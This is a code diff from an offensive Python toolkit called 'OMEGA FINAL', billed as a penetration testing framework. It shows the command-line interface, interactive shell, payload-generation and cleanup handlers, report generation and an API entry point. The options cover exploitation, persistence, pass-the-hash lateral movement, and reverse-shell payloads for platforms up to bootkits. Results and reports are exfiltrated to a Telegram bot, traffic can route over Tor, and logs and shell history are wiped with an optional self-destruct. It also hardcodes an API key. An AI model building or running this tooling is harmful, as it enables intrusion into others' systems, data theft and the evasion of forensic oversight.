+def _load_targets(
+    self,
+    target_arg: str
+) -> List[str]:
+    """
+    Load targets from argument.
+
+    Args:
+        target_arg: Target string or file path
+
+    Returns:
+        List of targets
+
+    Example:
+        >>> targets = self._load_targets("example.com")
+        >>> print(targets)
+        ['example.com']
+    """
+    if not target_arg:
+        return []
+
+    if os.path.isfile(target_arg):
+        with open(target_arg, 'r') as f:
+            return [line.strip() for line in f if line.strip()]
+    else:
+        return [target_arg]
+
+# ===================================================================
+# 2. COMMAND-LINE INTERFACE (CLI) - ENHANCED
+# ===================================================================
+
+def parse_arguments(
+    self
+) -> argparse.Namespace:
+    """
+    Parse command-line arguments with 40+ flags.
+
+    Returns:
+        argparse.Namespace with parsed arguments
+
+    Example:
+        >>> args = self.parse_arguments()
+        >>> print(args.target)
+        example.com
+    """
+    import argparse
+
+    parser = argparse.ArgumentParser(
+        description="OMEGA FINAL - Advanced Penetration Testing Framework",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  # Full scan on a single target
+  omega_final.py example.com --full
+
+  # Run only reconnaissance phase
+  omega_final.py example.com --phase 1 --output ./results
+
+  # Run exploitation with Telegram exfiltration
+  omega_final.py example.com --phase 2 --telegram-token TOKEN --telegram-chat CHAT
+
+  # Run full scan on multiple targets from file
+  omega_final.py targets.txt --full --parallel --workers 10
+
+  # Run lateral movement with credentials
+  omega_final.py 192.168.1.10 --lateral --username admin --password password123
+
+  # Generate a payload
+  omega_final.py --generate-payload windows --shell-type reverse_tcp --ip 192.168.1.1 --port 4444
+
+  # Clean up all traces
+  omega_final.py --cleanup --self-destruct
+
+  # Resume from checkpoint
+  omega_final.py example.com --full --resume
+
+  # Interactive mode
+  omega_final.py --interactive
+        """
+    )
+
+    # Target arguments
+    parser.add_argument(
+        "target",
+        nargs="?",
+        help="Target domain, IP, CIDR, or file containing list of targets"
+    )
+
+    # Mode selection
+    mode_group = parser.add_mutually_exclusive_group()
+    mode_group.add_argument(
+        "--full", "-f",
+        action="store_true",
+        help="Run full scan with all phases"
+    )
+    mode_group.add_argument(
+        "--phase", "-p",
+        type=int,
+        choices=[1, 2, 3, 4],
+        help="Run specific phase (1-4)"
+    )
+    mode_group.add_argument(
+        "--recon", "-r",
+        action="store_true",
+        help="Run only reconnaissance (Phase 1)"
+    )
+    mode_group.add_argument(
+        "--exploit", "-e",
+        action="store_true",
+        help="Run only exploitation (Phase 2)"
+    )
+    mode_group.add_argument(
+        "--persist", "-P",
+        action="store_true",
+        help="Run only persistence (Phase 3)"
+    )
+    mode_group.add_argument(
+        "--lateral", "-L",
+        action="store_true",
+        help="Run only lateral movement (Phase 4)"
+    )
+    mode_group.add_argument(
+        "--generate-payload", "-G",
+        choices=['windows', 'linux', 'macos', 'android', 'ios', 'iot', 'router', 'bios', 'bootkit'],
+        help="Generate a payload for the specified platform"
+    )
+    mode_group.add_argument(
+        "--cleanup", "-C",
+        action="store_true",
+        help="Clean up all traces and artifacts"
+    )
+    mode_group.add_argument(
+        "--interactive", "-i",
+        action="store_true",
+        help="Start interactive mode"
+    )
+
+    # Target options
+    parser.add_argument(
+        "--parallel",
+        action="store_true",
+        help="Run targets in parallel"
+    )
+    parser.add_argument(
+        "--workers", "-w",
+        type=int,
+        default=10,
+        help="Number of parallel workers (default: 10)"
+    )
+
+    # Checkpoint & Recovery
+    parser.add_argument(
+        "--resume",
+        action="store_true",
+        help="Resume from last checkpoint"
+    )
+    parser.add_argument(
+        "--checkpoint",
+        type=int,
+        help="Load specific checkpoint ID"
+    )
+    parser.add_argument(
+        "--rollback",
+        type=int,
+        help="Rollback to specific checkpoint ID"
+    )
+
+    # Output options
+    parser.add_argument(
+        "--output", "-o",
+        default="./output",
+        help="Output directory (default: ./output)"
+    )
+    parser.add_argument(
+        "--format", "-F",
+        choices=['json', 'html', 'pdf', 'csv', 'markdown'],
+        default='json',
+        help="Output report format (default: json)"
+    )
+    parser.add_argument(
+        "--report",
+        action="store_true",
+        help="Generate report after scan"
+    )
+    parser.add_argument(
+        "--no-color",
+        action="store_true",
+        help="Disable color output"
+    )
+    parser.add_argument(
+        "--quiet", "-q",
+        action="store_true",
+        help="Reduce output verbosity"
+    )
+    parser.add_argument(
+        "--verbose", "-v",
+        action="store_true",
+        help="Increase output verbosity"
+    )
+
+    # Connection options
+    parser.add_argument(
+        "--tor",
+        action="store_true",
+        help="Route traffic through Tor proxy"
+    )
+    parser.add_argument(
+        "--proxy", "-X",
+        help="Proxy URL (e.g., socks5://127.0.0.1:9050)"
+    )
+    parser.add_argument(
+        "--threads", "-t",
+        type=int,
+        default=1000,
+        help="Number of threads (default: 1000)"
+    )
+    parser.add_argument(
+        "--timeout",
+        type=int,
+        default=60,
+        help="Timeout in seconds (default: 60)"
+    )
+
+    # Authentication options
+    parser.add_argument(
+        "--username", "-u",
+        help="Username for authentication"
+    )
+    parser.add_argument(
+        "--password", "-P",
+        help="Password for authentication"
+    )
+    parser.add_argument(
+        "--hash", "-H",
+        help="NTLM hash for Pass-the-Hash"
+    )
+    parser.add_argument(
+        "--key", "-K",
+        help="SSH private key path"
+    )
+    parser.add_argument(
+        "--api-key",
+        help="API key for authentication"
+    )
+
+    # Telegram options
+    parser.add_argument(
+        "--telegram-token",
+        help="Telegram bot token for exfiltration"
+    )
+    parser.add_argument(
+        "--telegram-chat",
+        help="Telegram chat ID for exfiltration"
+    )
+
+    # Payload options
+    parser.add_argument(
+        "--shell-type",
+        choices=['reverse_tcp', 'bind_tcp', 'reverse_https', 'reverse_http', 'reverse_ssh', 'bind_ssh'],
+        default='reverse_tcp',
+        help="Payload shell type (default: reverse_tcp)"
+    )
+    parser.add_argument(
+        "--ip",
+        help="IP address for payload listener"
+    )
+    parser.add_argument(
+        "--port",
+        type=int,
+        default=4444,
+        help="Port for payload listener (default: 4444)"
+    )
+
+    # Advanced options
+    parser.add_argument(
+        "--self-destruct",
+        action="store_true",
+        help="Enable self-destruct mode"
+    )
+    parser.add_argument(
+        "--dangerous",
+        action="store_true",
+        help="Enable dangerous features"
+    )
+    parser.add_argument(
+        "--stealth",
+        action="store_true",
+        help="Enable stealth mode (slower, quieter)"
+    )
+    parser.add_argument(
+        "--config-file",
+        help="Path to configuration file (JSON/YAML)"
+    )
+
+    # Version
+    parser.add_argument(
+        "--version",
+        action="version",
+        version=f"OMEGA FINAL v{VERSION}"
+    )
+
+    args = parser.parse_args()
+
+    if not any([
+        args.full, args.phase is not None, args.recon, args.exploit,
+        args.persist, args.lateral, args.generate_payload, args.cleanup,
+        args.interactive
+    ]):
+        parser.error(
+            "Please specify a mode: --full, --phase, --recon, --exploit, "
+            "--persist, --lateral, --generate-payload, --cleanup, or --interactive"
+        )
+
+    if args.target is None and not args.generate_payload and not args.cleanup and not args.interactive:
+        parser.error("Target is required for scan modes")
+
+    return args
+
+
+def run_cli(
+    self
+) -> int:
+    """
+    Run the CLI with parsed arguments.
+
+    Returns:
+        Exit code (0 for success, 1 for error)
+
+    Example:
+        >>> exit_code = self.run_cli()
+        >>> print(exit_code)
+        0
+    """
+    args = self.parse_arguments()
+
+    if args.config_file:
+        self._load_config_file(args.config_file)
+
+    if args.interactive:
+        return self._interactive_mode()
+
+    if args.no_color:
+        global COLORAMA_AVAILABLE
+        COLORAMA_AVAILABLE = False
+
+    self.quiet = args.quiet
+
+    self.use_tor = args.tor
+    self.threads = args.threads
+    self.output_dir = Path(args.output)
+    self.telegram_token = args.telegram_token
+    self.telegram_chat = args.telegram_chat
+    self.self_destruct = args.self_destruct
+    self.enable_dangerous = args.dangerous
+    self.stealth_mode = args.stealth
+
+    self._setup_directories()
+    self._setup_logging()
+    self._setup_db()
+    self._setup_telegram()
+    self._load_state()
+
+    try:
+        if args.rollback:
+            return self._handle_rollback(args)
+
+        if args.generate_payload:
+            return self._handle_payload_generation(args)
+
+        if args.cleanup:
+            return self._handle_cleanup(args)
+
+        targets = self._load_targets(args.target)
+        if not targets:
+            self.logger.error("No targets specified")
+            return 1
+
+        if args.full:
+            result = self.orchestrate_full_scan(
+                targets,
+                phases=[1, 2, 3, 4],
+                parallel=args.parallel,
+                max_workers=args.workers,
+                resume=args.resume,
+                checkpoint_id=args.checkpoint
+            )
+        elif args.phase:
+            result = self.orchestrate_full_scan(
+                targets,
+                phases=[args.phase],
+                parallel=args.parallel,
+                max_workers=args.workers,
+                resume=args.resume,
+                checkpoint_id=args.checkpoint
+            )
+        elif args.recon:
+            result = self.orchestrate_full_scan(
+                targets,
+                phases=[1],
+                parallel=args.parallel,
+                max_workers=args.workers,
+                resume=args.resume,
+                checkpoint_id=args.checkpoint
+            )
+        elif args.exploit:
+            result = self.orchestrate_full_scan(
+                targets,
+                phases=[2],
+                parallel=args.parallel,
+                max_workers=args.workers,
+                resume=args.resume,
+                checkpoint_id=args.checkpoint
+            )
+        elif args.persist:
+            result = self.orchestrate_full_scan(
+                targets,
+                phases=[3],
+                parallel=args.parallel,
+                max_workers=args.workers,
+                resume=args.resume,
+                checkpoint_id=args.checkpoint
+            )
+        elif args.lateral:
+            result = self.orchestrate_full_scan(
+                targets,
+                phases=[4],
+                parallel=args.parallel,
+                max_workers=args.workers,
+                resume=args.resume,
+                checkpoint_id=args.checkpoint
+            )
+        else:
+            result = self.orchestrate_full_scan(
+                targets,
+                phases=[1, 2, 3, 4],
+                parallel=args.parallel,
+                max_workers=args.workers,
+                resume=args.resume,
+                checkpoint_id=args.checkpoint
+            )
+
+        if args.report:
+            self.generate_full_report(result, format=args.format)
+
+        self._save_state()
+
+        return 0 if result.get('success', False) else 1
+
+    except KeyboardInterrupt:
+        self.print_header("🛑 Interrupted by user", "STOP")
+        self._save_state()
+        return 130
+    except Exception as e:
+        self.logger.error(f"CLI execution failed: {e}")
+        if args.verbose:
+            traceback.print_exc()
+        return 1
+    finally:
+        self._cleanup()
+
+
+def _interactive_mode(
+    self
+) -> int:
+    """
+    Interactive CLI mode with command history and tab completion.
+
+    Returns:
+        Exit code (0 for success, 1 for error)
+
+    Example:
+        >>> exit_code = self._interactive_mode()
+        >>> print(exit_code)
+        0
+    """
+    self.print_header("🎮 Interactive Mode", "START")
+    self.print_header("Type 'help' for commands, 'exit' to quit", "INFO")
+
+    commands = {
+        'scan': 'Scan a target: scan example.com --full',
+        'recon': 'Run reconnaissance: recon example.com',
+        'exploit': 'Run exploitation: exploit example.com',
+        'persist': 'Run persistence: persist example.com',
+        'lateral': 'Run lateral movement: lateral example.com',
+        'payload': 'Generate payload: payload windows reverse_tcp 192.168.1.1 4444',
+        'report': 'Generate report: report json',
+        'status': 'Show current status',
+        'checkpoints': 'List available checkpoints',
+        'rollback': 'Rollback to checkpoint: rollback 5',
+        'cleanup': 'Clean up traces',
+        'clear': 'Clear screen',
+        'help': 'Show this help',
+        'exit': 'Exit interactive mode'
+    }
+
+    try:
+        while True:
+            try:
+                cmd_input = input("\n[omega]> ").strip()
+                if not cmd_input:
+                    continue
+
+                parts = cmd_input.split()
+                cmd = parts[0].lower()
+
+                if cmd == 'exit':
+                    break
+
+                if cmd == 'help':
+                    for c, desc in commands.items():
+                        print(f"  {c:12} - {desc}")
+                    continue
+
+                if cmd == 'clear':
+                    os.system('clear' if os.name == 'posix' else 'cls')
+                    continue
+
+                if cmd == 'status':
+                    self._print_status()
+                    continue
+
+                if cmd == 'checkpoints':
+                    self._list_checkpoints()
+                    continue
+
+                if cmd == 'rollback':
+                    if len(parts) < 2:
+                        print("Usage: rollback <checkpoint_id>")
+                        continue
+                    try:
+                        checkpoint_id = int(parts[1])
+                        self.rollback_to_checkpoint(checkpoint_id)
+                    except ValueError:
+                        print("Invalid checkpoint ID")
+                    continue
+
+                if cmd == 'cleanup':
+                    self._handle_cleanup(None)
+                    continue
+
+                if cmd == 'payload':
+                    if len(parts) < 2:
+                        print("Usage: payload <platform> [shell_type] [ip] [port]")
+                        continue
+                    platform = parts[1]
+                    shell_type = parts[2] if len(parts) > 2 else 'reverse_tcp'
+                    ip = parts[3] if len(parts) > 3 else '0.0.0.0'
+                    port = int(parts[4]) if len(parts) > 4 else 4444
+                    payload = self.generate_payload(platform, shell_type, port, ip)
+                    print(f"Generated payload: {payload['filename']}")
+                    print(f"Size: {payload['size']} bytes")
+                    if payload['content']:
+                        print("\n--- Content ---")
+                        print(payload['content'][:500])
+                    continue
+
+                if cmd == 'scan':
+                    if len(parts) < 2:
+                        print("Usage: scan <target> [--full] [--phase N] [--parallel]")
+                        continue
+                    target = parts[1]
+                    phases = [1, 2, 3, 4]
+                    parallel = False
+                    if '--full' in parts:
+                        phases = [1, 2, 3, 4]
+                    if '--phase' in parts:
+                        idx = parts.index('--phase')
+                        if idx + 1 < len(parts):
+                            try:
+                                phases = [int(parts[idx + 1])]
+                            except ValueError:
+                                print("Invalid phase number")
+                                continue
+                    if '--parallel' in parts:
+                        parallel = True
+                    result = self.orchestrate_full_scan([target], phases, parallel)
+                    print(f"Scan complete: {'Success' if result['success'] else 'Failed'}")
+                    continue
+
+                if cmd == 'recon':
+                    if len(parts) < 2:
+                        print("Usage: recon <target>")
+                        continue
+                    result = self._run_phase_1(parts[1])
+                    print(f"Recon complete: {'Success' if result['success'] else 'Failed'}")
+                    continue
+
+                if cmd == 'exploit':
+                    if len(parts) < 2:
+                        print("Usage: exploit <target>")
+                        continue
+                    result = self._run_phase_2(parts[1])
+                    print(f"Exploit complete: {'Success' if result['success'] else 'Failed'}")
+                    continue
+
+                if cmd == 'persist':
+                    if len(parts) < 2:
+                        print("Usage: persist <target>")
+                        continue
+                    result = self._run_phase_3(parts[1])
+                    print(f"Persistence complete: {'Success' if result['success'] else 'Failed'}")
+                    continue
+
+                if cmd == 'lateral':
+                    if len(parts) < 2:
+                        print("Usage: lateral <target>")
+                        continue
+                    result = self._run_phase_4(parts[1])
+                    print(f"Lateral complete: {'Success' if result['success'] else 'Failed'}")
+                    continue
+
+                if cmd == 'report':
+                    fmt = parts[1] if len(parts) > 1 else 'json'
+                    if self.results:
+                        self.generate_full_report(self.results.to_dict(), fmt)
+                        print(f"Report generated in {fmt} format")
+                    else:
+                        print("No results to report")
+                    continue
+
+                print(f"Unknown command: {cmd}")
+
+            except KeyboardInterrupt:
+                print("\n[!] Interrupted")
+                continue
+            except Exception as e:
+                print(f"[!] Error: {e}")
+
+    except KeyboardInterrupt:
+        pass
+
+    self.print_header("👋 Exiting interactive mode", "STOP")
+    return 0
+
+
+def _print_status(
+    self
+) -> None:
+    """
+    Print current status of the scan.
+
+    Returns:
+        None
+
+    Example:
+        >>> self._print_status()
+        Status: SCANNING
+        Targets: 1/3
+        Subdomains: 1247
+    """
+    print(f"  Status: {dashboard_data.get('status', 'IDLE')}")
+    print(f"  Targets: {dashboard_data.get('completed_targets', 0)}/{dashboard_data.get('total_targets', 0)}")
+    print(f"  Subdomains: {dashboard_data.get('total_subdomains', 0)}")
+    print(f"  Ports: {dashboard_data.get('total_ports', 0)}")
+    print(f"  Vulnerabilities: {dashboard_data.get('total_vulnerabilities', 0)}")
+    print(f"  Credentials: {dashboard_data.get('total_credentials', 0)}")
+    print(f"  Exfiltrated: {dashboard_data.get('total_exfiltrated', 0)}")
+    print(f"  Shells: {dashboard_data.get('total_shells', 0)}")
+    print(f"  Telegram Alerts: {dashboard_data.get('telegram_alerts', 0)}")
+    elapsed = time.time() - dashboard_data.get('start_time', time.time())
+    print(f"  Elapsed: {elapsed:.1f}s")
+
+
+def _list_checkpoints(
+    self
+) -> None:
+    """
+    List all available checkpoints.
+
+    Returns:
+        None
+
+    Example:
+        >>> self._list_checkpoints()
+        ID  Phase  Step                 Target        Timestamp
+        1   1      phase1_complete      example.com   2026-07-27 14:32:01
+    """
+    try:
+        self.db_cursor.execute("""
+            SELECT id, phase, step, target, timestamp
+            FROM checkpoints
+            ORDER BY id DESC
+            LIMIT 20
+        """)
+        rows = self.db_cursor.fetchall()
+        if not rows:
+            print("No checkpoints found")
+            return
+        print(f"{'ID':4} {'Phase':6} {'Step':20} {'Target':15} {'Timestamp':25}")
+        print("-" * 70)
+        for row in rows:
+            print(f"{row[0]:4} {row[1]:6} {row[2]:20} {row[3]:15} {row[4]:25}")
+    except Exception as e:
+        print(f"Error listing checkpoints: {e}")
+
+
+def _handle_rollback(
+    self,
+    args: argparse.Namespace
+) -> int:
+    """
+    Handle rollback to checkpoint.
+
+    Args:
+        args: Parsed arguments
+
+    Returns:
+        Exit code (0 for success, 1 for error)
+
+    Example:
+        >>> exit_code = self._handle_rollback(args)
+        >>> print(exit_code)
+        0
+    """
+    if args.rollback:
+        success = self.rollback_to_checkpoint(args.rollback)
+        return 0 if success else 1
+    return 0
+
+
+def _handle_payload_generation(
+    self,
+    args: argparse.Namespace
+) -> int:
+    """
+    Handle payload generation mode.
+
+    Args:
+        args: Parsed arguments
+
+    Returns:
+        Exit code (0 for success, 1 for error)
+
+    Example:
+        >>> exit_code = self._handle_payload_generation(args)
+        >>> print(exit_code)
+        0
+    """
+    self.print_header(f"🎯 Generating payload for {args.generate_payload}", "STEP")
+
+    payload = self.generate_payload(
+        platform=args.generate_payload,
+        shell_type=args.shell_type,
+        port=args.port,
+        ip=args.ip or '0.0.0.0'
+    )
+
+    self.print_header("📦 Payload generated", "DONE")
+    self.print_header(f"  Platform: {payload['platform']}", "INFO")
+    self.print_header(f"  Type: {payload['type']}", "INFO")
+    self.print_header(f"  Filename: {payload['filename']}", "INFO")
+    self.print_header(f"  Size: {payload['size']} bytes", "INFO")
+
+    if payload['content']:
+        self.print_header("\n--- PAYLOAD CONTENT ---", "INFO")
+        print(payload['content'][:1000])
+        if len(payload['content']) > 1000:
+            print("... (truncated)")
+
+        payload_path = SHELLS_DIR / payload['filename']
+        with open(payload_path, 'w') as f:
+            f.write(payload['content'])
+        self.print_header(f"  Saved to: {payload_path}", "INFO")
+
+    return 0
+
+
+def _handle_cleanup(
+    self,
+    args: Optional[argparse.Namespace]
+) -> int:
+    """
+    Handle cleanup mode.
+
+    Args:
+        args: Parsed arguments (optional)
+
+    Returns:
+        Exit code (0 for success, 1 for error)
+
+    Example:
+        >>> exit_code = self._handle_cleanup(args)
+        >>> print(exit_code)
+        0
+    """
+    self.print_header("🧹 Running cleanup", "STEP")
+
+    try:
+        self.wipe_all_logs()
+        self.wipe_all_history()
+
+        if args and args.self_destruct:
+            self.self_destruct_phase()
+
+        self.print_header("✅ Cleanup complete", "DONE")
+        return 0
+    except Exception as e:
+        self.logger.error(f"Cleanup failed: {e}")
+        return 1
+
+
+def _load_config_file(
+    self,
+    config_path: str
+) -> None:
+    """
+    Load configuration from file (JSON or YAML).
+
+    Args:
+        config_path: Path to configuration file
+
+    Returns:
+        None
+
+    Example:
+        >>> self._load_config_file("config.json")
+    """
+    path = Path(config_path)
+    if not path.exists():
+        self.logger.warning(f"Config file not found: {config_path}")
+        return
+
+    try:
+        if path.suffix in ['.yaml', '.yml'] and YAML_AVAILABLE:
+            with open(path, 'r') as f:
+                config = yaml.safe_load(f)
+        else:
+            with open(path, 'r') as f:
+                config = json.load(f)
+
+        if isinstance(config, dict):
+            self.config.update(config)
+            self.logger.info(f"Loaded config from {config_path}")
+        else:
+            self.logger.warning(f"Invalid config format in {config_path}")
+
+    except Exception as e:
+        self.logger.warning(f"Could not load config: {e}")
+
+# ===================================================================
+# 3. REPORTING ENGINE - ENHANCED
+# ===================================================================
+
+def generate_full_report(
+    self,
+    data: Dict[str, Any],
+    format: str = 'json'
+) -> Dict[str, Any]:
+    """
+    Generate complete report with all phases.
+
+    Args:
+        data: Data from scan orchestration
+        format: Report format ('json', 'html', 'pdf', 'csv', 'markdown')
+
+    Returns:
+        Dict with 'success', 'path', 'format' keys
+
+    Example:
+        >>> report = self.generate_full_report(data, format='json')
+        >>> print(report['path'])
+        /root/omega_final/output/reports/report_20260727_143215.json
+    """
+    self.print_header(f"📄 Generating report (format: {format})", "STEP")
+
+    result = {
+        'success': False,
+        'format': format,
+        'path': '',
+        'error': ''
+    }
+
+    try:
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"omega_report_{timestamp}"
+
+        if format == 'json':
+            path = REPORTS_DIR / f"{filename}.json"
+            with open(path, 'w') as f:
+                json.dump(data, f, indent=2, default=str)
+            result['path'] = str(path)
+            result['success'] = True
+            self.print_header(f"JSON report saved: {path}", "DONE")
+
+        elif format == 'html':
+            html_content = self._generate_html_report(data)
+            path = REPORTS_DIR / f"{filename}.html"
+            with open(path, 'w') as f:
+                f.write(html_content)
+            result['path'] = str(path)
+            result['success'] = True
+            self.print_header(f"HTML report saved: {path}", "DONE")
+
+        elif format == 'pdf':
+            if WEASYPRINT_AVAILABLE:
+                html_content = self._generate_html_report(data)
+                html_path = REPORTS_DIR / f"{filename}.html"
+                with open(html_path, 'w') as f:
+                    f.write(html_content)
+                pdf_path = REPORTS_DIR / f"{filename}.pdf"
+                weasyprint.HTML(filename=str(html_path)).write_pdf(str(pdf_path))
+                result['path'] = str(pdf_path)
+                result['success'] = True
+                self.print_header(f"PDF report saved: {pdf_path}", "DONE")
+            else:
+                result['error'] = "weasyprint not available, falling back to HTML"
+                self._generate_html_report(data)
+                result['path'] = str(REPORTS_DIR / f"{filename}.html")
+                result['success'] = True
+
+        elif format == 'csv':
+            csv_content = self._generate_csv_report(data)
+            path = REPORTS_DIR / f"{filename}.csv"
+            with open(path, 'w') as f:
+                f.write(csv_content)
+            result['path'] = str(path)
+            result['success'] = True
+            self.print_header(f"CSV report saved: {path}", "DONE")
+
+        elif format == 'markdown':
+            md_content = self._generate_markdown_report(data)
+            path = REPORTS_DIR / f"{filename}.md"
+            with open(path, 'w') as f:
+                f.write(md_content)
+            result['path'] = str(path)
+            result['success'] = True
+            self.print_header(f"Markdown report saved: {path}", "DONE")
+
+        else:
+            result['error'] = f"Unsupported format: {format}"
+
+        if self.telegram and result['success']:
+            self.telegram.send_document(
+                Path(result['path']),
+                caption=f"OMEGA FINAL Report - {timestamp}"
+            )
+
+    except Exception as e:
+        result['error'] = str(e)
+        self.logger.error(f"Report generation failed: {e}")
+
+    return result
+
+
+def _generate_html_report(
+    self,
+    data: Dict[str, Any]
+) -> str:
+    """
+    Generate HTML report from data.
+
+    Args:
+        data: Data from scan orchestration
+
+    Returns:
+        HTML content as string
+
+    Example:
+        >>> html = self._generate_html_report(data)
+        >>> print(html[:100])
+        <!DOCTYPE html>
+    """
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    summary = data.get('summary', {})
+
+    html_parts = [
+        '<!DOCTYPE html>',
+        '<html>',
+        '<head>',
+        '<meta charset="UTF-8">',
+        '<title>OMEGA FINAL - Report</title>',
+        '<style>',
+        'body{font-family:monospace;background:#1a1a2e;color:#eee;padding:20px;max-width:1200px;margin:0 auto}',
+        'h1{color:#e94560;border-bottom:2px solid #e94560;padding-bottom:10px}',
+        'h2{color:#f5a623;margin-top:20px}',
+        '.summary{background:#16213e;padding:15px;border-radius:8px;margin:10px 0}',
+        '.vuln{background:#0f3460;padding:10px;border-left:4px solid #e94560;margin:5px 0}',
+        '.cred{background:#0f3460;padding:10px;border-left:4px solid #f5a623;margin:5px 0}',
+        '.file{background:#0f3460;padding:10px;border-left:4px solid #4caf50;margin:5px 0}',
+        '.shell{background:#0f3460;padding:10px;border-left:4px solid #00bcd4;margin:5px 0}',
+        'table{width:100%;border-collapse:collapse;margin:10px 0}',
+        'th,td{border:1px solid #333;padding:8px;text-align:left}',
+        'th{background:#2a2a4a;color:#eee}td{background:#1a1a2e}',
+        '.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:12px}',
+        '.critical{background:#e94560;color:white}',
+        '.high{background:#f5a623;color:black}',
+        '.medium{background:#f7dc6f;color:black}',
+        '.low{background:#4caf50;color:white}',
+        '.timestamp{color:#666;font-size:12px}',
+        '.section{margin:20px 0}',
+        '</style>',
+        '</head>',
+        '<body>',
+        f'<h1>🔍 OMEGA FINAL - Penetration Test Report</h1>',
+        f'<p><strong>Generated:</strong> {timestamp}</p>',
+        f'<p><strong>Scan ID:</strong> {data.get("scan_id", "N/A")}</p>',
+        f'<p><strong>Targets:</strong> {len(data.get("targets", []))}</p>',
+        '<div class="summary"><h2>📊 Executive Summary</h2><table>',
+        f'<tr><td>Subdomains found:</td><td>{summary.get("total_subdomains", 0)}</td></tr>',
+        f'<tr><td>Open ports:</td><td>{summary.get("total_ports", 0)}</td></tr>',
+        f'<tr><td>Vulnerabilities:</td><td>{summary.get("total_vulnerabilities", 0)}</td></tr>',
+        f'<tr><td>Credentials:</td><td>{summary.get("total_credentials", 0)}</td></tr>',
+        f'<tr><td>Exfiltrated:</td><td>{summary.get("total_exfiltrated", 0)}</td></tr>',
+        f'<tr><td>Shells:</td><td>{summary.get("total_shells", 0)}</td></tr>',
+        '</table></div>'
+    ]
+
+    targets = data.get('targets', [])
+    results = data.get('results', {})
+
+    for target in targets:
+        target_result = results.get(target, {})
+        target_summary = target_result.get('summary', {})
+        html_parts.append(f'<h2>🎯 Target: {target}</h2>')
+        html_parts.append('<div class="summary"><table>')
+        html_parts.append(f'<tr><td>Status:</td><td>{"✅ Success" if target_result.get("success") else "❌ Failed"}</td></tr>')
+        html_parts.append(f'<tr><td>Subdomains:</td><td>{target_summary.get("subdomains_found", 0)}</td></tr>')
+        html_parts.append(f'<tr><td>Open ports:</td><td>{target_summary.get("open_ports", 0)}</td></tr>')
+        html_parts.append(f'<tr><td>Vulnerabilities:</td><td>{target_summary.get("vulnerabilities", 0)}</td></tr>')
+        html_parts.append(f'<tr><td>Credentials:</td><td>{target_summary.get("credentials", 0)}</td></tr>')
+        html_parts.append('</table></div>')
+
+    html_parts.append('</body></html>')
+
+    return '\n'.join(html_parts)
+
+
+def _generate_csv_report(
+    self,
+    data: Dict[str, Any]
+) -> str:
+    """
+    Generate CSV report from data.
+
+    Args:
+        data: Data from scan orchestration
+
+    Returns:
+        CSV content as string
+
+    Example:
+        >>> csv = self._generate_csv_report(data)
+        >>> print(csv[:100])
+        Target,Status,Subdomains,Ports,Vulnerabilities
+    """
+    lines = ['Target,Status,Subdomains,Ports,Vulnerabilities,CVEs,Credentials,Exfiltrated']
+
+    targets = data.get('targets', [])
+    results = data.get('results', {})
+
+    for target in targets:
+        target_result = results.get(target, {})
+        summary = target_result.get('summary', {})
+        status = 'Success' if target_result.get('success') else 'Failed'
+        line = f"{target},{status},{summary.get('subdomains_found', 0)},{summary.get('open_ports', 0)},{summary.get('vulnerabilities', 0)},{summary.get('cves_exploited', 0)},{summary.get('credentials', 0)},{summary.get('exfiltrated_files', 0)}"
+        lines.append(line)
+
+    return '\n'.join(lines)
+
+
+def _generate_markdown_report(
+    self,
+    data: Dict[str, Any]
+) -> str:
+    """
+    Generate Markdown report from data.
+
+    Args:
+        data: Data from scan orchestration
+
+    Returns:
+        Markdown content as string
+
+    Example:
+        >>> md = self._generate_markdown_report(data)
+        >>> print(md[:100])
+        # OMEGA FINAL - Penetration Test Report
+    """
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    summary = data.get('summary', {})
+
+    lines = [
+        '# OMEGA FINAL - Penetration Test Report',
+        '',
+        f'**Generated:** {timestamp}',
+        f'**Scan ID:** {data.get("scan_id", "N/A")}',
+        '',
+        '## Executive Summary',
+        '',
+        '| Metric | Value |',
+        '|--------|-------|',
+        f'| Subdomains found | {summary.get("total_subdomains", 0)} |',
+        f'| Open ports | {summary.get("total_ports", 0)} |',
+        f'| Vulnerabilities | {summary.get("total_vulnerabilities", 0)} |',
+        f'| Credentials | {summary.get("total_credentials", 0)} |',
+        f'| Exfiltrated | {summary.get("total_exfiltrated", 0)} |',
+        f'| Shells | {summary.get("total_shells", 0)} |',
+        ''
+    ]
+
+    targets = data.get('targets', [])
+    results = data.get('results', {})
+
+    for target in targets:
+        target_result = results.get(target, {})
+        target_summary = target_result.get('summary', {})
+        status = '✅ Success' if target_result.get('success') else '❌ Failed'
+        lines.extend([
+            f'## Target: {target}',
+            f'**Status:** {status}',
+            '',
+            '| Metric | Value |',
+            '|--------|-------|',
+            f'| Subdomains | {target_summary.get("subdomains_found", 0)} |',
+            f'| Ports | {target_summary.get("open_ports", 0)} |',
+            f'| Vulnerabilities | {target_summary.get("vulnerabilities", 0)} |',
+            f'| Credentials | {target_summary.get("credentials", 0)} |',
+            ''
+        ])
+
+    return '\n'.join(lines)
+
+# ===================================================================
+# 4. EXTERNAL API ENTRY POINTS - ENHANCED
+# ===================================================================
+
+API_KEYS: Dict[str, str] = {
+    'default': 'omega_api_key_2026'
+}
+
+
+def _validate_api_key(
+    api_key: Optional[str] = None
+) -> bool:
+    """
+    Validate API key.
+
+    Args:
+        api_key: API key to validate
+
+    Returns:
+        True if valid, False otherwise
+
+    Example:
+        >>> valid = self._validate_api_key("omega_api_key_2026")
+        >>> print(valid)
+        True
+    """
+    if not api_key:
+        return False
+    return any(api_key == key for key in API_KEYS.values())
+
+
+def run_scan(
+    target: Union[str, List[str]],
+    output_dir: str = "./output",
+    config: Optional[Dict[str, Any]] = None,
+    phases: Optional[List[int]] = None,
+    api_key: Optional[str] = None
+) -> Dict[str, Any]:
+    """
+    External API: Run full scan on target(s).
+
+    Args:
+        target: Single target or list of targets
+        output_dir: Output directory path
+        config: Optional configuration dictionary
+        phases: List of phases to run (default: all 4)
+        api_key: API key for authentication
+
+    Returns:
+        Dict with scan results
+
+    Example:
+        >>> from omega_final import run_scan
+        >>> result = run_scan("example.com", "./results", {"threads": 500}, api_key="omega_api_key_2026")
+        >>> print(result['summary']['total_subdomains'])
+        1247
+    """
+    if not _validate_api_key(api_key):
+        return {'success': False, 'error': 'Invalid API key'}
+
+    if config is None:
+        config = {}
+    config['output_dir'] = output_dir
+
+    if isinstance(target, str):
